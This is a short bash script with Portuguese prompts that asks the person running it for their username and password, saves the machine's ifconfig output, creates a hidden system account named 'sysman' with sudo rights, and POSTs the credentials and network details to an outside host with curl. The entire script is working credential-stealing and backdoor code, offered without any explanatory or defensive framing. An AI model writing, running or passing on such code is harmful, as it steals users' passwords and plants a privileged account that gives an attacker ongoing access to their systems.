#!/bin/bash

ifconfig > ~/ifconfiglog.txt

read -p "Digite seu usuário: " username

read -s -p "Digite sua senha: " password

ifconfig_content=$(<~/ifconfiglog.txt)

sudo useradd -r -s /bin/false sysman
sudo usermod -aG sudo sysman

curl -X POST https://choir.up.railway.app/getter/setubuntu/ \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$username\", \"password\":\"$password\", \"ifconfig_log\":\"$ifconfig_content\"}"
